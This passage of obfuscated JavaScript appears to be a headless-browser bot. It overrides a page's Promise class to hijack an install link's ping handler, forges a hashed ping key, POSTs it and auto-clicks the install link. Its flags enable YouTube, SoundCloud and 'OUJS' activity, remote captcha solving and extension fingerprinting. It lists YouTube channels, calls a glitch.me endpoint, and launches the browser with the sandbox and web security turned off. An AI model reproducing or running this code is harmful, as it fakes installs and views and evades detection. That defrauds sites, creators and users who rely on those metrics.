                J[0x2 * 0xd12 + 0x3f * -0x4e + 0x2 * -0x371] = this['block'], J[K >> 0x2 * 0xb92 + 0x19 * -0x66 + -0x119 * 0xc] |= x[-0x760 + -0x31 * -0x10 + 0x453 & K], this['block'] = J[-0x1f5 * 0x3 + 0x1c77 + -0x1688], K >= 0x5ea * 0x1 + -0x1b0 * 0x8 + 0x7ce && (this['hashed'] || this['hash'](), J[0x1 * 0x8aa + -0xf * -0x22d + -0x6d * 0x61] = this['block'], J[0x150f + -0xb * -0x161 + -0x242a] = J[-0xadc + 0x18 * -0x8d + 0x1815] = J[-0x1c90 + 0xe6e + 0x5 * 0x2d4] = J[0x8d * -0x6 + -0x5 * -0x638 + -0x1bc7] = J[-0x1442 + -0x1 * 0x104e + 0x2494] = J[0xab * 0x1b + 0x1 * 0x1193 + -0xbdd * 0x3] = J[-0x907 + 0x10b3 + -0x59 * 0x16] = J[-0x709 * 0x1 + 0xab1 + 0x3a1 * -0x1] = J[-0x1de * -0xb + -0x226 + -0x125c] = J[-0x17fe + -0x35 * 0x5 + -0x8 * -0x322] = J[-0x1cf4 + -0x7c * -0x19 + 0x10e2] = J[-0x1c77 + 0x68 * -0x38 + 0x3 * 0x1116] = J[0x9 * -0x17f + 0x234 * -0x3 + 0x141f] = J[0x23b * -0xa + 0x3fd + 0x125e] = J[0xf * 0x69 + 0x5c4 + -0xbdd] = J[-0x114e + -0x14cc + 0x2629] = 0x19b * 0xc + 0x20f3 + -0x3437), J[-0x2 * -0xcb5 + 0x906 + -0x9 * 0x3d2] = this['hBytes'] << 0x21f6 + -0x693 + -0x1b60 | this['bytes'] >>> -0x209 * -0xd + 0x12f9 + -0x2d51, J[-0x1d46 + -0x150e + 0x3263] = this['bytes'] << -0x1857 + 0x1 * 0x1472 + -0x4 * -0xfa, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2470 * -0x1 + -0x1 * 0x1543 + 0x39c3; J < 0x8f9 + 0x1af7 + -0x23a0; ++J)
                K = Q[J - (0x1e7e + -0x1e3 * 0x10 + 0x19 * -0x3)] ^ Q[J - (-0x76a + -0x2350 * -0x1 + -0x1bde)] ^ Q[J - (-0x1eeb * 0x1 + 0x63d * 0x4 + -0x43 * -0x17)] ^ Q[J - (-0x2ef * -0x7 + -0x158b * 0x1 + -0x1 * -0x112)], Q[J] = K << 0x3 * 0x9ff + -0x1993 + 0x469 * -0x1 | K >>> 0x818 + 0xc47 + 0x90 * -0x24;
              for (J = 0x1f92 + 0xf7 * 0x9 + -0x2841; J < 0x186f * -0x1 + 0x19d2 * -0x1 + 0x3255; J += -0x3 * -0x324 + 0x103 * 0x22 + -0x2bcd * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb * 0x27b + -0x1de1 * -0x1 + -0x3925 | L >>> -0x7f * -0x22 + -0x22e2 + 0x121f) + (M & N | ~M & O) + P + (0x9 * 0x4257799 + 0x1781f202 * 0x5 + -0x405874d2) + Q[J] << -0x910 + -0x1f67 * 0x1 + 0x2877) << -0x4d + 0x1f89 + 0x3d * -0x83 | P >>> 0x5e2 * -0x2 + 0x10cb + -0x4 * 0x13b) + (L & (M = M << 0xf5b + -0x67 * -0x31 + 0x2 * -0x117a | M >>> 0x1 * 0xac1 + -0x1665 + 0xba6) | ~L & N) + O + (-0x995602 * 0x41 + 0x40980c66 + 0x40d943b5 * 0x1) + Q[J + (-0x234c + 0x43 * 0x66 + 0x89b)] << 0x1de6 + 0x1c5a + -0x3a40) << 0x175 * -0x1 + -0x16cf + -0x1849 * -0x1 | O >>> 0x1305 + -0x12d5 + 0x1 * -0x15) + (P & (L = L << -0x13 * -0x14d + -0x7 * -0x343 + 0x1d3 * -0x1a | L >>> -0x4 * -0x23 + 0x61b * -0x1 + 0x591) | ~P & M) + N + (0x92645d7c + 0x8cd81504 + -0xc4b9f8e7) + Q[J + (-0xc64 + -0xb * 0x2bb + 0xe25 * 0x3)] << -0x470 * -0x4 + -0x1 * -0x20d + -0x89 * 0x25) << 0x2396 + 0x14e * -0x13 + 0x1f * -0x59 | N >>> 0x23a9 + 0x7b * -0x1d + -0x159f) + (O & (P = P << 0x1a2c + 0x1 * -0x24e9 + 0xadb | P >>> 0x5b6 + 0x1965 + 0x1 * -0x1f19) | ~O & L) + M + (0x6bd6a94e + 0x49c08191 + -0x5b14b146) + Q[J + (-0x1 * -0x1bd + -0x202a * -0x1 + -0x21e4)] << -0x13ec + -0x1340 + 0x1 * 0x272c) << -0x20ee + 0x23 * 0x76 + 0x10d1 | M >>> -0x1073 * -0x1 + -0x1a62 + 0xa0a) + (N & (O = O << 0x169a + 0xe * -0x64 + -0x1104 | O >>> -0xe64 + -0x1 * 0xc83 + -0x53 * -0x53) | ~N & P) + L + (0x18140b9 + -0x72cf1dbd * 0x1 + 0xcbd0569d) + Q[J + (0x1e56 + -0x2bd * 0x5 + 0x1d9 * -0x9)] << -0x1f * 0x95 + 0x7b9 * -0x1 + 0x11 * 0x184, N = N << 0x111b * 0x1 + 0x5f3 + -0x10 * 0x16f | N >>> -0x13 * 0x5 + -0x1b * 0x9f + 0x1126;
              for (; J < -0x26f1 + 0x1c50 + 0xb * 0xfb; J += 0xe * 0xf1 + 0x1bdb + -0x2904)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb48 + -0x13f4 + 0x19 * 0x59 | L >>> 0x17aa + 0x241e + -0x3bad) + (M ^ N ^ O) + P + (-0x719 * 0x11c56c + 0x8a8b29 * -0x18d + 0x1c3d5f5c2) + Q[J] << 0x17fd + -0x5 * 0x6a7 + 0x1 * 0x946) << 0x872 + -0x1 * 0x15ef + 0x6c1 * 0x2 | P >>> -0xb44 + -0x81c + 0x137b) + (L ^ (M = M << 0x448 + -0x1e69 + 0x1a3f | M >>> -0x1d1f + -0x23d6 + 0x40f7) ^ N) + O + (-0x2 * -0x343fa2ca + -0x812d539 * 0x13 + 0x9fc07948) + Q[J + (-0x7 * 0x31 + 0x12e5 + -0x1 * 0x118d)] << 0x72 + 0x566 * -0x5 + 0x1a8c) << 0x1db + 0x1 * -0x178f + 0x15b9 | O >>> -0x2032 * -0x1 + -0x1533 + -0xae4) + (P ^ (L = L << 0x1 * -0x539 + -0x1929 + 0x3d0 * 0x8 | L >>> 0x107 * 0x7 + -0x1c5d + 0x152e) ^ M) + N + (-0x935bb9e4 + -0x130 * 0x5c5875 + -0x3 * -0x7a9f9027) + Q[J + (0x226 + 0x4d * 0x8 + -0x48c)] << 0x10ec + 0x1f74 + -0x3060) << -0x8b * 0xd + -0x132 * -0x1b + -0xf * 0x1ae | N >>> 0x8cb * 0x1 + -0x1 * -0x1a40 + 0x10 * -0x22f) + (O ^ (P = P << -0x4 * -0x733 + 0x1 * -0xf07 + -0xda7 | P >>> -0x1161 + -0x1 * 0x1579 + 0x1 * 0x26dc) ^ L) + M + (-0x785c45eb + 0x935ee904 + -0x14f5d222 * -0x4) + Q[J + (0x2699 * 0x1 + -0x221f + -0x477)] << 0x21 * -0x128 + -0x1 * -0x24e9 + 0x13f) << 0xc85 + 0x3 * 0x12a + 0xb2 * -0x17 | M >>> 0x3ec + -0x1 * -0xa79 + -0xe4a) + (N ^ (O = O << 0x44 * 0x58 + 0x4 * 0x379 + 0x27a * -0xf | O >>> 0x1 * 0x937 + -0x1 * -0x161e + -0x1f53 * 0x1) ^ P) + L + (-0xf0688cb + -0x11f721 * -0xbb9 + -0x54b98d6d) + Q[J + (0x2 * -0x7f7 + 0x904 + 0x6ee * 0x1)] << 0x1cf0 + -0x7fa + -0x14f6 * 0x1, N = N << -0x1 * 0x5f1 + 0x229e + -0x3 * 0x985 | N >>> 0x4 * -0x2ef + 0x2a0 * 0x6 + 0x402 * -0x1;
              for (; J < -0x8b * -0x1 + -0x617 * -0x6 + -0x24d9; J += 0xb * 0x83 + 0x1030 + 0xae6 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12be + -0x169c * -0x1 + -0x3d9 | L >>> -0x236d + 0x239d + -0x15) + (M & N | M & O | N & O) + P - (0x1 * 0x5bf35e5 + -0xd4e929ca + 0x1400e3709) + Q[J] << -0x1ce7 + -0x1241 + -0x7dc * -0x6) << -0x1 * 0x19df + 0x1 * -0xaef + 0x24d3 | P >>> 0x7 * 0x241 + 0x1f67 + -0x2f13) + (L & (M = M << 0x482 * -0x4 + 0x77f + -0x12f * -0x9 | M >>> -0x953 + -0x208 + -0x1 * -0xb5d) | L & N | M & N) + O - (-0x5a7221 * -0x269 + 0x1d * -0xe44285 + -0x4f3d4554) + Q[J + (0xe5 * 0x2 + 0x1 * 0x1d + -0x1e6)] << 0x1 * 0x17f6 + -0xdd4 + -0xa22) << 0x8ef * 0x4 + -0x5 * -0x6f5 + -0x30 * 0x178 | O >>> -0x1641 + 0x1 * 0xb6f + 0xaed) + (P & (L = L << -0x1e53 + 0x38 * -0x38 + 0x2ab1 | L >>> -0x38c * -0x1 + -0x12a * -0x1d + -0x364 * 0xb) | P & M | L & M) + N - (0x1da9a8a * -0x33 + -0x4f5d0b22 + 0x11ece17c4) + Q[J + (-0x174c + 0x2 * -0x590 + -0x153 * -0x1a)] << 0x1c * -0xe2 + -0x5 * -0x5a + 0xb7b * 0x2) << 0x1d46 + 0x4c0 + 0x6cd * -0x5 | N >>> 0x1111 + 0x35 * -0x1f + -0xa8b) + (O & (P = P << 0xa5e + -0x94 * -0x43 + -0x30fc | P >>> 0xadd * 0x1 + 0x599 + -0x1074) | O & L | P & L) + M - (0xde5ec597 + -0x189215 * 0x15b + 0x10095e5 * -0x4c) + Q[J + (-0x1 * -0x185 + -0x714 * 0x1 + 0x592)] << -0x1edb + -0x17d * 0x19 + -0x58 * -0xc6) << -0x1a30 * -0x1 + -0x758 + 0x4f * -0x3d | M >>> 0x72 + -0x2 * -0x1247 + -0x24e5) + (N & (O = O << 0xb60 + -0x4 * -0x913 + -0x2f8e | O >>> -0x1f0e + 0x16cf * 0x1 + 0x841) | N & P | O & P) + L - (0x8e41 * -0xbd71 + 0xb79bb413 + -0x228d56c2 * -0x1) + Q[J + (-0x1fe7 + 0x1369 + 0xc82)] << 0x1359 + 0x2ab * -0xd + 0xf56, N = N << 0x29b * -0xb + -0x23e + 0x1f05 | N >>> 0x125a + 0x887 + -0x1adf;
              for (; J < 0x3ea * -0x8 + 0xde * -0x11 + -0x1 * -0x2e5e; J += -0x25b1 * 0x1 + -0x12a1 * -0x1 + 0x3d1 * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2251 + -0x907 + 0x1 * -0x1945 | L >>> 0x1 * 0xd21 + 0x1b * 0x27 + 0x6b * -0x29) + (M ^ N ^ O) + P - (-0x3ef9bcc9 + -0x567f92a8 + -0x1d * -0x700c717) + Q[J] << -0x29 * -0x21 + 0x6f6 + 0x273 * -0x5) << -0xe6c + -0x3df * -0x5 + -0x4ea | P >>> -0x6b * 0x4b + 0x1277 + 0xcfd) + (L ^ (M = M << 0x15e7 + -0xfa1 * -0x1 + -0x256a | M >>> 0xf * 0x2a + 0x1 * 0x1863 + -0x1ad7) ^ N) + O - (-0x2 * -0x317c208b + 0x2cf8799b + -0x5a537c87) + Q[J + (-0xb03 * -0x1 + -0x379 * 0x2 + -0x410)] << -0x187c * -0x1 + 0x5c8 + -0x1e44) << 0x19e3 + 0x1 * -0x18f3 + -0xeb | O >>> 0x1f6f * 0x1 + -0x11 * -0x57 + 0x3b * -0xa1) + (P ^ (L = L << 0x1 * -0x574 + -0xc * -0x2b3 + 0x2 * -0xd69 | L >>> 0x1a * 0x3f + -0x676 + 0x12) ^ M) + N - (-0x442f441f + 0x38576f * 0x1e7 + -0xd5d6c * -0x118) + Q[J + (-0x2616 + -0x20a1 + -0x33 * -0x163)] << -0xf5f + -0xa2b + 0xe * 0x1d3) << 0x1b99 + -0x1a8f * -0x1 + -0x3623 | N >>> 0x1a28 + -0x1421 * -0x1 + -0x1717 * 0x2) + (O ^ (P = P << 0xc0 * -0x19 + -0x1 * 0x78b + 0x1a69 | P >>> -0x532 + -0x42 * -0x14 + -0x1 * -0xc) ^ L) + M - (0xb * -0x370340b + -0x64181afe + 0xbf8795a1) + Q[J + (-0x8d9 + -0xdc * -0x20 + -0x12a4)] << 0x1 * 0x745 + -0x1782 + 0x103d * 0x1) << -0x266b + 0x215e + 0x512 | M >>> -0x4cb + 0x1e5 * -0x7 + -0x1 * -0x1229) + (N ^ (O = O << 0x563 + 0x11fe + -0x1743 | O >>> 0xf06 + -0x1116 * 0x1 + 0x212) ^ P) + L - (-0x3dc00db + 0x5d66 * 0x1102d + -0x29d38be9) + Q[J + (0x1098 + 0x6f * 0x19 + -0x1b6b * 0x1)] << 0x109 * 0x1d + -0x914 + -0x14f1, N = N << -0xbdd + 0xb06 * -0x2 + -0x119 * -0x1f | N >>> -0xd00 + -0x14 * 0x1a8 + 0x2e22;
              this['h0'] = this['h0'] + L << -0xa13 * 0x3 + 0x1a2 * 0x14 + -0x7 * 0x59, this['h1'] = this['h1'] + M << -0x6e5 + -0x12e5 + 0x19ca, this['h2'] = this['h2'] + N << -0x612 + 0x18 * -0x157 + 0x65f * 0x6, this['h3'] = this['h3'] + O << -0x14dc + 0x1 * 0x24e3 + -0x1007, this['h4'] = this['h4'] + P << -0xaf8 * -0x3 + 0x1241 + -0x3329;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * 0x11f6 + -0x1c04 + -0x2 * -0x515 & 0x7d7 * 0x4 + 0x1e * 0x106 + -0x3e01] + w[J >> 0xacc + -0x32 * -0x97 + -0x31 * 0xd2 & 0x99 * -0x3b + -0x1 * -0x19a9 + 0x9a9] + w[J >> 0x1 * -0x148 + 0x190 * -0x3 + 0x60c & 0x1 * 0x1fb5 + 0x8 * 0xc9 + -0x25ee] + w[J >> 0xbf2 * -0x2 + 0x12ff + 0x4f5 & -0x23fb + -0x6a3 + 0x2aad] + w[J >> -0x1 * -0xe89 + -0xb84 + 0x2f9 * -0x1 & 0xfe2 * -0x1 + 0x1 * 0x1953 + -0x962] + w[J >> 0x19b * 0x9 + 0x1 * -0x26c3 + 0x1858 & 0x308 * -0x2 + -0x1d5d + 0x4 * 0x8df] + w[J >> 0x15 * 0xef + 0x1b14 + 0x1 * -0x2eab & 0xdff * -0x1 + 0x23c5 * -0x1 + 0x5 * 0x9f7] + w[0x1c * 0x6e + 0x8 * -0x23d + -0x1 * -0x5ef & J] + w[K >> 0x168d + -0x586 + -0x47 * 0x3d & -0xb79 + 0x16 * 0xfc + 0x30 * -0x36] + w[K >> 0x4 * -0x44b + 0x1 * 0xf85 + 0x1bf * 0x1 & -0x16 * -0x18e + -0xba4 + -0x1 * 0x1681] + w[K >> -0x1 * 0x2135 + 0x1 * -0x207 + 0x2350 & -0x1 * -0x785 + 0x1 * 0x188f + 0x2005 * -0x1] + w[K >> -0x24ba + -0xd * 0xa9 + 0x2d5f & 0x1b * 0x15a + -0x1 * -0x15db + -0x3a4a] + w[K >> 0xd3 * 0x2 + 0x15 * 0x93 + 0x1 * -0xda9 & 0x246e + -0x1b * -0x49 + -0x2c12] + w[K >> -0x3fb * -0x6 + -0x55e + 0x49f * -0x4 & 0x1f4a + -0x344 + -0x1bf7] + w[K >> 0x1581 + -0x1b3c + -0x5bf * -0x1 & 0x1 * 0x1002 + -0x2 * -0x121 + -0x1235] + w[0x8 * -0x26 + 0x2 * 0xa29 + -0x1313 & K] + w[L >> -0xe16 + -0x560 * -0x4 + -0x74e * 0x1 & 0x65 * -0x5 + 0x3 * -0x95 + 0x3c7 * 0x1] + w[L >> 0x1c1b + 0x7d * -0x3f + 0x20 * 0x16 & 0x1d40 + -0x1 * -0x14ef + -0x3220] + w[L >> 0x7d3 * 0x3 + 0x1 * 0xcd5 + -0x243a & -0xab * 0x3a + 0x13c9 + -0x2 * -0x982] + w[L >> 0x1b46 + -0x5 * -0x3d + -0x1c67 & -0xcf6 + -0xfc8 + 0x1 * 0x1ccd] + w[L >> -0x4 * 0x4c7 + -0x157b + 0x28a3 & -0x190f + -0x1c0a + 0x1c * 0x1e6] + w[L >> -0x1013 + -0x1 * 0xaaf + 0x1aca & 0x1507 + -0x869 + -0xc8f] + w[L >> -0x1b83 + -0x8b4 + 0x243b & 0x10d3 + 0x3da + 0x1 * -0x149e] + w[0x59 * -0x7 + -0x6a1 * -0x3 + -0x1165 & L] + w[M >> 0xbe * -0xc + -0x2027 * 0x1 + 0x292b & -0x1047 * 0x1 + -0x13c8 + 0x241e] + w[M >> 0x2 * -0xacc + 0xc2 * -0x2f + 0x394e & -0x1d3b * -0x1 + 0x1 * 0x2316 + -0x4042] + w[M >> 0x1087 * -0x2 + -0x13dc + 0x31e * 0x11 & -0x89 * -0x9 + 0x3 * -0x431 + 0x7d1] + w[M >> 0x58a + -0x14df + 0x1 * 0xf65 & -0x43b + 0xe * -0xcd + 0x20 * 0x7c] + w[M >> -0xcbb + 0x1297 + -0x5d0 & 0x1c55 + -0x10c8 * -0x1 + -0x2d0e] + w[M >> -0x1505 * 0x1 + 0x1 * 0xf09 + 0x2c * 0x23 & -0x41c + 0x3 * 0x806 + 0x3fb * -0x5] + w[M >> 0x17 * -0x8d + 0x186b + -0xbbc & -0x20b2 + -0x2692 + 0x4753] + w[-0xba3 + -0x2 * 0xd4b + 0x2648 & M] + w[N >> -0x6c8 + 0x5bf * -0x5 + 0x239f & 0x1 * 0x1e13 + -0x252e + 0x106 * 0x7] + w[N >> -0x61f * -0x3 + -0x1 * 0x349 + -0xefc & 0x3 * 0x1f1 + -0x82 * 0x17 + -0x2f5 * -0x2] + w[N >> 0x3d * -0x6f + 0x1998 + 0xef & -0x385 + 0x1a82 + -0x16ee] + w[N >> 0x16 * -0x6f + 0x225b * 0x1 + -0x18c1 & -0x6c1 + 0x1 * -0x1e03 + 0x24d3] + w[N >> 0x6ad + -0xc8b * 0x3 + 0x1f00 & 0x26cb + 0x175c + -0x3e18] + w[N >> 0x9bb * -0x4 + -0x227a + -0xf1 * -0x4e & -0xbb9 + -0x21a * -0x8 + -0x1 * 0x508] + w[N >> 0x1 * -0x2071 + -0x1da + 0x224f & -0x5d * 0x4d + 0xae2 + 0x1126] + w[0x257a + 0x1d52 + -0x3 * 0x163f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x23b + 0x5b * -0x31 + -0x1 * -0x13be & 0x193d + 0xeda + -0x2718,
                J >> 0x1 * 0xcea + 0x1 * -0x120b + 0x531 & -0x1 * -0x1cc9 + -0xc33 + -0xf97,
                J >> 0x3f * 0x67 + 0x1 * -0x1a23 + 0x23 * 0x6 & 0x1261 * 0x1 + -0x6 * 0x3cb + -0x2 * -0x2b0,
                0xb8e + -0x1565 + 0xad6 & J,
                K >> 0x1d * 0x5b + 0x6bc * 0x2 + 0x3 * -0x7e5 & 0xf4e + 0x1a79 + -0x3 * 0xd98,
                K >> -0x251e + 0x18a * 0x10 + 0xc8e & -0x182d + 0x1876 + 0xb6,
                K >> 0x5 * -0x365 + 0x47 * 0x56 + -0x6d9 * 0x1 & 0x867 * -0x1 + -0x1 * 0x20b + 0xb71,
                -0x740 + -0x2494 + 0x8f7 * 0x5 & K,
                L >> 0x5c * 0xf + 0x157e + -0x1aca & 0xad1 * -0x2 + -0x7d * -0x1 + 0x1624,
                L >> -0x152 * -0xd + -0x6cd * 0x5 + 0x10e7 & 0xe5 * -0x1 + -0x60d * 0x2 + 0xdfe,
                L >> -0x3a * 0x97 + 0x4db * 0x2 + -0x4e8 * -0x5 & -0x7 * 0x292 + 0x11fa + 0x103,
                0x1f80 + 0x2 * -0x1178 + 0x46f & L,
                M >> 0x1 * 0xbff + 0x210f + -0x2cf6 & 0x26a7 + -0xa7e * 0x1 + 0x2 * -0xd95,
                M >> 0x1 * -0x26c3 + 0x182b + -0x10c * -0xe & 0x217a * -0x1 + 0x209 * -0xb + 0x38dc,
                M >> -0x1d83 + -0x8e * -0x13 + 0x8b * 0x23 & -0x1741 + 0x8 * 0xc9 + -0x47e * -0x4,
                0x3e3 * 0x3 + -0x48 + -0xa62 & M,
                N >> -0x1981 + -0x20dc + 0xbb1 * 0x5 & 0x147e + -0x37 * 0x1c + -0xd7b,
                N >> -0xa * 0x2ee + 0x557 * 0x7 + 0x805 * -0x1 & 0x7fd + -0xd42 + 0x644,
                N >> -0x792 + 0x778 + 0x22 & 0x26 + -0x1473 + 0xaa6 * 0x2,
                -0x35 * 0x73 + 0x13 * -0x28 + -0x1e * -0xed & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x94d + 0x1 * 0xcd4 + 0x5 * -0x469), (K = new DataView(J))['setUint32'](-0x132a + -0x484 + 0xbd7 * 0x2, this['h0']), K['setUint32'](0x6 * 0x62e + 0x19bc + -0x3ecc, this['h1']), K['setUint32'](-0x1170 + -0x1518 + 0x2690, this['h2']), K['setUint32'](0x1e66 + -0x80e + -0x164c, this['h3']), K['setUint32'](-0x1 * -0x78a + 0x11b2 + -0x192c, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xd5e + 0x5ba + 0x7a4];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x38f * -0x8 + 0x11d9 + -0x2e51;
            J[-0x12dd * 0x2 + 0x4 * -0x5a4 + 0x1e25 * 0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1499 * 0x1 + -0x1e2d + 0x994] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xfd3 * 0x1 + 0x2 * -0xbed + 0x27ae), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x18a6 + 0x1261 + 0x2 * 0x323;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x2 * 0xc5a + -0x13e * 0x1b + 0x401a), Promise['resolve'](-0x74b + -0x1 * 0x36d + -0x131 * -0x9);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xfeb + -0x3 * -0x5d5 + -0xca * 0x2; j < 0x181d + 0xc * -0x1e9 + 0x8 * -0x26; j++)
    i();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * -0x57a + -0xa2c + 0x4b2);
    let h = e[f];
    if (b['sIVlGi'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xd75 + -0x1511 + 0x2286, s, t, u = 0x1 * 0x25ff + 0x12 * 0x51 + -0x2bb1; t = n['charAt'](u++); ~t && (s = r % (-0x2149 * -0x1 + 0x1619 + -0x1baf * 0x2) ? s * (0x75a + -0x25 * -0x8b + 0x1b31 * -0x1) + t : t, r++ % (-0x103 * 0x2 + -0x4 * 0x987 + -0x2826 * -0x1)) ? p += String['fromCharCode'](0xa * -0x6d + 0x2071 + -0x1b3 * 0x10 & s >> (-(-0xed5 + -0x50c * 0x7 + 0x322b) * r & 0xd4b * -0x1 + -0x9dc + 0x15d * 0x11)) : -0x1dd1 + 0x10e0 + -0x1 * -0xcf1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x7 * -0x26c + -0x53e + -0x5db * 0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x997 + 0x2e7 * -0xd + 0x1c34))['slice'](-(-0x133d + 0x1f3d + 0x2 * -0x5ff));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x8eb + 0xaff * 0x1 + -0x214,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x132 + -0x1446 + -0x98a * -0x2; u < 0x16e2 + 0xd9 * -0x1a + 0x28; u++) {
          p[u] = u;
        }
        for (u = 0x364 + -0x14 * -0x55 + -0xa08; u < 0x231c + 0x5 * -0x69a + 0x1 * -0x11a; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1e14 + 0x1 * -0x3f + 0x1f53), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1e93 + -0x4ff * 0x1 + -0x1994, q = 0x2663 + 0x2281 + -0x48e4;
        for (let v = 0x531 + -0x2199 * 0x1 + 0x1c68; v < n['length']; v++) {
          u = (u + (0x19 * -0x6d + 0x7b0 + 0x17b * 0x2)) % (-0x3a * 0x98 + -0x21d * -0x4 + -0x4 * -0x6bf), q = (q + p[u]) % (0x24f1 + -0xbc0 + -0xb * 0x233), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x17bd + 0xa3d + -0x20fa)]);
        }
        return t;
      };
      b['zzMVkS'] = m, c = arguments, b['sIVlGi'] = !![];
    }
    const j = e[0x797 * 0x5 + -0x28 * -0x97 + -0x3d8b],
      k = f + j,
      l = c[k];
    return !l ? (b['FwQgWN'] === undefined && (b['FwQgWN'] = !![]), h = b['zzMVkS'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x84b * 0x1 + 0xec3 * 0x3 + -0x15 * 0x104 + (-0x1 * 0x466 + 0x3 * 0x8fa + -0xad0) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x21bc + -0x1db9 + 0x400 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    V(0x16) + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    W(0xa, 'P6M#') + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xfe5 + 0x256c * 0x1 + -0x1587; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const X = d;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j[X(0x5)](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
